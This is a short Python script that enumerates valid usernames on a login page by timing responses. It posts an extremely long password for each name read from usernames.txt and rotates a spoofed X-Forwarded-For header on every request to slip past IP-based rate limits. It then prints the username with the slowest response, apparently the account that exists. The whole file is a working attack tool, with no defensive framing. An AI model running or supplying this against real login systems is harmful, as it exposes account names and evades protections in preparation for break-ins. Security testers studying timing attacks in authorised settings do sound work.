import requests
import time

# Replace with the URL you want to send the request to, should be end with /login
url = "https://www.example.com/login"

# save the user names in a file called usernames.txt
file_path = 'usernames.txt'

# ip to change the ip for each request
ip=2

# max to get the mamimum response time
max=0 


# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        user = line.strip()
    
        data = {
        'username': user,
        'password': 'aaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc'
        }
        
        ip=ip+1
        ip_add = '192.168.2.' + str(ip)
        
        # add X-Forwarded-For header 
        headers = {
        'X-Forwarded-For': ip_add,
        }

        # Compute the response time
        start_time = time.time() 
        response = requests.post(url, data=data, headers=headers)
        response_time = time.time() - start_time
      
        if response_time>max :
          user_max_time = user 
          max=response_time
                            
print(user_max_time) 
